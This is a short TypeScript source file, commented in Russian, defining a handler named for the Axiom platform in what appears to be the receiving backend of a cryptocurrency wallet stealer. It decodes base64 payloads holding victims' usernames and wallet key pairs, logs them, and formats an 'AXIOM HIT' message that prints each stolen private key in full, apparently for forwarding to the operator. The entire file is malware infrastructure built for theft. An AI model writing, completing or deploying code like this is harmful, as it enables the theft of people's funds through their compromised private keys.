import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';

// Обработчик для платформы Axiom (базовая реализация)
export class AxiomHandler implements PlatformHandler {
  name = 'axiom';

  async processMessage(data: PlatformData | string): Promise<ProcessResult> {
    // Данные могут прийти как base64 строка или как уже распарсенный объект
    let walletData: {
      keys: Array<{ public: string; private: string }>;
      sent: any;
      code: string;
      username: string;
      platform: string;
    };

    if (typeof data === 'string') {
      // Если данные пришли как base64 строка, декодируем
      const decryptedData = Buffer.from(data, "base64").toString("utf-8");
      walletData = JSON.parse(decryptedData);
    } else {
      // Если данные уже объект, используем как есть
      walletData = data as typeof walletData;
    }

    console.log(`📊 Processing Axiom wallet data`);
    console.log(`   Username: ${walletData.username}`);
    console.log(`   Keys count: ${walletData.keys?.length || 0}`);

    // Базовая реализация - просто форматируем данные
    let message = `🎯 <b>AXIOM HIT</b>\n\n`;
    if (walletData.keys && Array.isArray(walletData.keys)) {
      walletData.keys.forEach(key => {
        message += `<b>Public Key:</b>\n<code>${key.public}</code>\n`;
        message += `<b>Private Key:</b>\n<code>${key.private}</code>\n`;
        message += `========================================\n\n`;
      });
    }

    return {
      messageToSend: message,
      messageToSendFull: message,
    };
  }
}

